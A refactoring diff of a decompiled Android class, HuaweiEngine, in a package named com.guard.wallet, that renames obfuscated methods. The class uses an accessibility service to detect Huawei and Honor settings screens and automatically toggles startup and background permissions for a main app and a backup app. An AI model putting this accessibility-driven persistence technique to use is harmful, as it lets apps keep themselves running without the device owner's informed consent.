@@ -59,7 +59,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
     public final AtomicBoolean x = new AtomicBoolean(false);
 
     public HuaweiEngine() {
-        super(s0(), "com.android.settings");
+        super(buildAllListenWindows(), "com.android.settings");
         try {
             this.p.schedule(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 4), 50L, TimeUnit.SECONDS);
         } catch (Exception e2) {
@@ -69,8 +69,8 @@ public final class HuaweiEngine extends KeepAliveEngine {
 
     // ======= Static CombineFilter builders =======
 
-    /** Filter: TextView text = HUA_WEI_ALLOW_AUTO_STARTUP_TEXT */
-    public static CombineFilter b0() {
+    /** vendor 原名: b0() — Filter: TextView text = HUA_WEI_ALLOW_AUTO_STARTUP_TEXT */
+    public static CombineFilter buildAutoStartFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -79,8 +79,8 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text = HUA_WEI_ALLOW_IN_BACKGROUND_TEXT */
-    public static CombineFilter c0() {
+    /** vendor 原名: c0() — Filter: TextView text = HUA_WEI_ALLOW_IN_BACKGROUND_TEXT */
+    public static CombineFilter buildBackgroundActivityFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -89,8 +89,8 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text = HUA_WEI_ALLOW_RELATE_STARTUP_TEXT */
-    public static CombineFilter d0() {
+    /** vendor 原名: d0() — Filter: TextView text = HUA_WEI_ALLOW_RELATE_STARTUP_TEXT */
+    public static CombineFilter buildRelateStartFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -99,8 +99,8 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: TextView text prefix = HUA_WEI_APP_AND_NOTIFICATION_TEXT */
-    public static CombineFilter e0() {
+    /** vendor 原名: e0() — Filter: TextView text prefix = HUA_WEI_APP_AND_NOTIFICATION_TEXT */
+    public static CombineFilter buildAppAndNotificationFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -109,16 +109,16 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** ListenWindow: com.android.settings / AppAndNotificationDashboardActivity */
-    public static ListenWindow f0() {
+    /** vendor 原名: f0() — ListenWindow: com.android.settings / AppAndNotificationDashboardActivity */
+    public static ListenWindow buildAppNotificationListenWindow() {
         ListenWindow lw = new ListenWindow("com.android.settings",
                 "com.android.settings.Settings$AppAndNotificationDashboardActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    /** Filter: TextView text = HUA_WEI_APP_STARTUP_MANAGE_TEXT */
-    public static CombineFilter g0() {
+    /** vendor 原名: g0() — Filter: TextView text = HUA_WEI_APP_STARTUP_MANAGE_TEXT */
+    public static CombineFilter buildStartupManageFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
@@ -127,8 +127,8 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** Filter: Button text = HUA_WEI_CONFIRM_TEXT */
-    public static CombineFilter l0() {
+    /** vendor 原名: l0() — Filter: Button text = HUA_WEI_CONFIRM_TEXT */
+    public static CombineFilter buildConfirmButtonFilter() {
         CombineFilter cf = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(cf,
                 FilterHelper.initFilter(cf, "className", "android.widget.Button"), "text");
@@ -137,64 +137,64 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return cf;
     }
 
-    /** ListenWindow: com.hihonor.systemmanager / AlertDialog */
-    public static ListenWindow m0() {
+    /** vendor 原名: m0() — ListenWindow: com.hihonor.systemmanager / AlertDialog */
+    public static ListenWindow buildHonorAlertDialogListenWindow() {
         ListenWindow lw = new ListenWindow("com.hihonor.systemmanager", "android.app.AlertDialog");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    /** ListenWindow: com.hihonor.systemmanager / StartupAppControlActivity */
-    public static ListenWindow n0() {
+    /** vendor 原名: n0() — ListenWindow: com.hihonor.systemmanager / StartupAppControlActivity */
+    public static ListenWindow buildHonorStartupListenWindow() {
         ListenWindow lw = new ListenWindow("com.hihonor.systemmanager",
                 "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    /** ListenWindow: com.huawei.systemmanager / AlertDialog */
-    public static ListenWindow o0() {
+    /** vendor 原名: o0() — ListenWindow: com.huawei.systemmanager / AlertDialog */
+    public static ListenWindow buildHuaweiAlertDialogListenWindow() {
         ListenWindow lw = new ListenWindow("com.huawei.systemmanager", "android.app.AlertDialog");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    /** ListenWindow: com.huawei.systemmanager / StartupAppControlActivity */
-    public static ListenWindow p0() {
+    /** vendor 原名: p0() — ListenWindow: com.huawei.systemmanager / StartupAppControlActivity */
+    public static ListenWindow buildHuaweiStartupListenWindow() {
         ListenWindow lw = new ListenWindow("com.huawei.systemmanager",
                 "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    /** ListenWindow: com.android.settings / HWSettings */
-    public static ListenWindow q0() {
+    /** vendor 原名: q0() — ListenWindow: com.android.settings / HWSettings */
+    public static ListenWindow buildHwSettingsListenWindow() {
         ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.HWSettings");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    /** Build full ListenWindow list for Huawei engine */
-    public static LinkedList s0() {
+    /** vendor 原名: s0() — Build full ListenWindow list for Huawei engine */
+    public static LinkedList buildAllListenWindows() {
         LinkedList list = new LinkedList();
         list.add(EngineHelper.cJ());
-        list.add(q0());
-        list.add(f0());
-        list.add(p0());
-        list.add(n0());
-        list.add(o0());
-        list.add(m0());
+        list.add(buildHwSettingsListenWindow());
+        list.add(buildAppNotificationListenWindow());
+        list.add(buildHuaweiStartupListenWindow());
+        list.add(buildHonorStartupListenWindow());
+        list.add(buildHuaweiAlertDialogListenWindow());
+        list.add(buildHonorAlertDialogListenWindow());
         return list;
     }
 
     // ======= Window detection helpers =======
 
-    /** Check if in AlertDialog (Huawei or Honor system manager) */
-    public final boolean h0() {
+    /** vendor 原名: h0() — Check if in AlertDialog (Huawei or Honor system manager) */
+    public final boolean isInAlertDialog() {
         try {
             LinkedList list = new LinkedList();
-            list.add(o0());
-            list.add(m0());
+            list.add(buildHuaweiAlertDialogListenWindow());
+            list.add(buildHonorAlertDialogListenWindow());
             if (this.q(list)) {
                 Log.d("o.n", "已进入应用启动手动管理对话框");
                 return true;
@@ -205,10 +205,10 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return false;
     }
 
-    /** Check if in AppAndNotificationDashboard */
-    public final boolean i0() {
+    /** vendor 原名: i0() — Check if in AppAndNotificationDashboard */
+    public final boolean isInAppAndNotification() {
         try {
-            if (this.q(Collections.singletonList(f0()))) {
+            if (this.q(Collections.singletonList(buildAppNotificationListenWindow()))) {
                 Log.d("o.n", "已进入应用和服务窗口");
                 return true;
             }
@@ -218,11 +218,11 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return false;
     }
 
-    /** Check if in HWSettings main page */
-    public final boolean j0() {
+    /** vendor 原名: j0() — Check if in HWSettings main page */
+    public final boolean isInHwSettings() {
         try {
             LinkedList list = new LinkedList();
-            list.add(q0());
+            list.add(buildHwSettingsListenWindow());
             if (this.q(list)) {
                 Log.d("o.n", "已进入华为系统设置窗口");
                 return true;
@@ -233,12 +233,12 @@ public final class HuaweiEngine extends KeepAliveEngine {
         return false;
     }
 
-    /** Check if in StartupAppControlActivity (Huawei or Honor) */
-    public final boolean k0() {
+    /** vendor 原名: k0() — Check if in StartupAppControlActivity (Huawei or Honor) */
+    public final boolean isInStartupAppControl() {
         try {
             LinkedList list = new LinkedList();
-            list.add(p0());
-            list.add(n0());
+            list.add(buildHuaweiStartupListenWindow());
+            list.add(buildHonorStartupListenWindow());
             if (this.q(list)) {
                 Log.d("o.n", "已进入应用启动管理窗口");
                 return true;
@@ -252,12 +252,13 @@ public final class HuaweiEngine extends KeepAliveEngine {
     // ======= Core keep-alive logic =======
 
     /**
-     * keepAlvieInStartupAppControl — toggle "manual management" for main and backup apps.
+     * vendor 原名: r0() — keepAlvieInStartupAppControl
+     * Toggle "manual management" for main and backup apps.
      * State machine: UNKNOWN -> MAIN_APP -> BACKUP_APP -> done.
      */
-    public final void r0() {
+    public final void toggleStartupSwitches() {
         try {
-            if (!k0()) {
+            if (!isInStartupAppControl()) {
                 return;
             }
             Log.d("o.n", "keepAlvieInStartupAppControl 窗口匹配");
@@ -274,7 +275,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
                 stateRef.set(KEEP_ALIVE_BACKUP);
             } else {
                 /* Both apps processed or backup not installed */
-                t0();
+                savePowerControlState();
                 Z();
                 return;
             }
@@ -328,7 +329,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
                 this.w.set(true);
                 this.u.set(true);
                 Log.d("o.n", "主进程已选择手动管理");
-                r0(); /* Recurse for backup app */
+                toggleStartupSwitches(); /* Recurse for backup app */
             } else {
                 /* Find backup app */
                 CombineFilter backupAppFilter = EngineHelper.cH(com.guard.wallet.utils.SystemHelper.e());
@@ -367,7 +368,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
                 this.x.set(true);
                 this.v.set(true);
                 Log.d("o.n", "备用进程已选择手动管理");
-                t0();
+                savePowerControlState();
                 Z();
             }
         } catch (Exception e2) {
@@ -376,9 +377,9 @@ public final class HuaweiEngine extends KeepAliveEngine {
     }
 
     /**
-     * t0() — save keep-alive strategy for both main and backup processes.
+     * vendor 原名: t0() — save keep-alive strategy for both main and backup processes.
      */
-    public final void t0() {
+    public final void savePowerControlState() {
         try {
             /* Save main process strategy */
             PowerControlStateVO mainState = com.guard.wallet.utils.SharedPrefsManager.k(
@@ -431,7 +432,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
                     if (MyAccessibilityService.P() != null) {
                         MyAccessibilityService.P().x();
                     }
-                    t0();
+                    savePowerControlState();
                     this.p.shutdownNow();
                     com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
                     this.n.clear();
@@ -459,7 +460,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
             if (event != null) {
                 super.u(event, packageName, className);
             }
-            boolean inHwSettings = j0();
+            boolean inHwSettings = isInHwSettings();
             String delegateId = this.c;
             ConcurrentLinkedQueue queue = this.n;
 
@@ -472,8 +473,8 @@ public final class HuaweiEngine extends KeepAliveEngine {
                     com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 0), delegateId);
                 }
             }
-            // ADAPT: HyperOS 3 降级后 j0()/i0() 同属 com.android.settings 可能同时 true
-            else if (i0()) {
+            // ADAPT: HyperOS 3 降级后 isInHwSettings()/isInAppAndNotification() 同属 com.android.settings 可能同时 true
+            else if (isInAppAndNotification()) {
                 queue.remove("keepAliveInHwSettings");
                 queue.remove("keepAlvieInStartupAppControl");
                 queue.remove("keepAliveInAlertDialog");
@@ -482,8 +483,8 @@ public final class HuaweiEngine extends KeepAliveEngine {
                     com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 1), delegateId);
                 }
             }
-            // ADAPT: k0()/h0() 同属 com.huawei.systemmanager 可能同时 true
-            else if (k0()) {
+            // ADAPT: isInStartupAppControl()/isInAlertDialog() 同属 com.huawei.systemmanager 可能同时 true
+            else if (isInStartupAppControl()) {
                 queue.remove("keepAliveInHwSettings");
                 queue.remove("keepAliveInAppAndNotification");
                 queue.remove("keepAliveInAlertDialog");
@@ -492,7 +493,7 @@ public final class HuaweiEngine extends KeepAliveEngine {
                     com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockTask(this, 2), delegateId);
                 }
             }
-            else if (h0()) {
+            else if (isInAlertDialog()) {
                 queue.remove("keepAliveInHwSettings");
                 queue.remove("keepAliveInAppAndNotification");
                 queue.remove("keepAlvieInStartupAppControl");
